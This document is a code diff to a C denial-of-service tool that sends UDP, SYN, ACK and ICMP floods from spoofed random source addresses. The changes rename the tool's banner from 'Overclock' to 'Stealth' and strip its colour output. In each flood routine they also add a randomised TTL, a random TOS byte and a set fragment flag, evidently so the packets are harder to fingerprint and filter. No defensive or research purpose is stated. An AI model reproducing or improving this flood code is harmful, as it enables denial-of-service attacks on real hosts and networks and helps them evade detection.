@@ -65,8 +65,7 @@ static inline uint32_t get_random_ip() {
     return htonl((fast_rand() % 254 + 1) | ((fast_rand() & 0xFF) << 8) | ((fast_rand() & 0xFF) << 16) | ((fast_rand() % 254 + 1) << 24));
 }
 
-#define PRINTING_LINE "\033[33m\033[1m─────────────────────────────────────────────────────────────\n\033[0m"
-#define PRINTING_LINE_1 "\033[1;34m─────────────────────────────────────────────────────────────\033[0m\n"
+#define PRINTING_LINE_1 "\033[1;34m=============================================================\033[0m\n"
 
 struct pseudo_header {
     uint32_t source_address;
@@ -103,20 +102,20 @@ void *stats_thread(void *arg) {
         last_pkts = current_pkts;
         last_bytes = current_bytes;
         
-        printf("\033[H");
+        printf("\r\033[K");
         printf("%s", PRINTING_LINE_1);
-        printf("\033[1;37m[ Layer 4 Extreme Overclock Engine v3.0 ]\033[0m\n");
+        printf("[ Layer 4 Stealth Extreme Engine v4.0 ]\n");
         printf("%s", PRINTING_LINE_1);
-        printf("Target:      \033[1;32m%s:%d\033[0m\n", target_ip, target_port);
-        printf("Method:      \033[1;36m%s\033[0m\n", method);
-        printf("Threads:     \033[1;33m%d\033[0m\n", target_threads);
+        printf("Target:      %s:%d\n", target_ip, target_port);
+        printf("Method:      %s\n", method);
+        printf("Threads:     %d\n", target_threads);
         printf("%s", PRINTING_LINE_1);
-        printf("Total Packets: \033[1;31m%llu\033[0m\n", current_pkts);
-        printf("Total Bytes:   \033[1;31m%llu MB\033[0m\n", current_bytes / (1024 * 1024));
+        printf("Total Packets: %llu\n", current_pkts);
+        printf("Total Bytes:   %llu MB\n", current_bytes / (1024 * 1024));
         printf("%s", PRINTING_LINE_1);
-        printf("Speed:         \033[1;35m%llu pps / %llu Mbps\033[0m\n", pps, (bps * 8) / (1024 * 1024));
+        printf("Speed:         %llu pps / %llu Mbps\n", pps, (bps * 8) / (1024 * 1024));
         printf("%s", PRINTING_LINE_1);
-        printf("Status:        \033[1;31;5m[ EXTREME ENGAGING... ]\033[0m\n");
+        printf("Status:        [ STEALTH ENGAGING... ]\n");
         printf("%s", PRINTING_LINE_1);
         fflush(stdout);
     }
@@ -154,7 +153,6 @@ void *udp_max_flood(void *arg) {
         iph->ihl = 5;
         iph->version = 4;
         iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + MAX_PAYLOAD;
-        iph->ttl = 64;
         iph->protocol = IPPROTO_UDP;
         iph->daddr = sin.sin_addr.s_addr;
 
@@ -180,6 +178,9 @@ void *udp_max_flood(void *arg) {
             
             iph->saddr = get_random_ip();
             iph->id = htons(fast_rand() & 0xFFFF);
+            iph->ttl = (fast_rand() % 64) + 64;
+            iph->tos = fast_rand() & 0xFF;
+            iph->frag_off = htons(0x2000);
             iph->check = 0;
             iph->check = csum_fast((unsigned short *)iph, sizeof(struct iphdr));
             
@@ -218,7 +219,6 @@ void *syn_flood_opt(void *arg) {
         iph->ihl = 5;
         iph->version = 4;
         iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
-        iph->ttl = 64;
         iph->protocol = IPPROTO_TCP;
         iph->daddr = sin.sin_addr.s_addr;
 
@@ -251,6 +251,9 @@ void *syn_flood_opt(void *arg) {
             
             iph->saddr = get_random_ip();
             iph->id = htons(fast_rand() & 0xFFFF);
+            iph->ttl = (fast_rand() % 64) + 64;
+            iph->tos = fast_rand() & 0xFF;
+            iph->frag_off = htons(0x2000);
             iph->check = 0;
             iph->check = csum_fast((unsigned short *)iph, sizeof(struct iphdr));
 
@@ -297,7 +300,6 @@ void *ack_flood_opt(void *arg) {
         iph->ihl = 5;
         iph->version = 4;
         iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
-        iph->ttl = 64;
         iph->protocol = IPPROTO_TCP;
         iph->daddr = sin.sin_addr.s_addr;
 
@@ -330,6 +332,9 @@ void *ack_flood_opt(void *arg) {
             
             iph->saddr = get_random_ip();
             iph->id = htons(fast_rand() & 0xFFFF);
+            iph->ttl = (fast_rand() % 64) + 64;
+            iph->tos = fast_rand() & 0xFF;
+            iph->frag_off = htons(0x2000);
             iph->check = 0;
             iph->check = csum_fast((unsigned short *)iph, sizeof(struct iphdr));
 
@@ -381,7 +386,6 @@ void *icmp_flood_opt(void *arg) {
         iph->ihl = 5;
         iph->version = 4;
         iph->tot_len = sizeof(struct iphdr) + sizeof(struct icmphdr) + payload_len;
-        iph->ttl = 64;
         iph->protocol = IPPROTO_ICMP;
         iph->daddr = sin.sin_addr.s_addr;
 
@@ -408,6 +412,9 @@ void *icmp_flood_opt(void *arg) {
             struct iphdr *iph = (struct iphdr *)datagrams[i];
             iph->saddr = get_random_ip();
             iph->id = htons(fast_rand() & 0xFFFF);
+            iph->ttl = (fast_rand() % 64) + 64;
+            iph->tos = fast_rand() & 0xFF;
+            iph->frag_off = htons(0x2000);
             iph->check = 0;
             iph->check = csum_fast((unsigned short *)iph, sizeof(struct iphdr));
         }
@@ -464,7 +471,7 @@ int main(int argc, char *argv[]) {
         sleep(1);
     }
     
-    printf("\n\033[1;31m[!] Stopping attack...\033[0m\n");
+    printf("\n[!] Stopping attack...\n");
     
     for (int i = 0; i < target_threads; i++) {
         pthread_cancel(th[i]);
